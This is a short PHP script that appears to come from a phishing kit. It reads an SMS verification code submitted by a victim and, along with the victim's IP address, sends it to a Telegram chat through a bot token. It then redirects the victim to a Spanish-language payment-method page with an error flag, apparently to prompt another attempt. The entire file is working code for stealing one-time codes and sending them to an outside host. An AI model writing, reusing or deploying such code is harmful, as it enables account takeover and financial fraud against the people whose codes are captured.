<?php
include "./client.php";
include "../telegram.php";
$sms = $_POST['sms'];
$message .= 'Sms : ' . $sms . "";
$message .= "IP:             : ".$ib."\n";
$tk = $token; $chid = $chatid; sendMessage($chid, $message, $tk);
header("location: ../Seleccione_medio_de_pago_codigo.php?error=1&validation#_$dispatch");
?>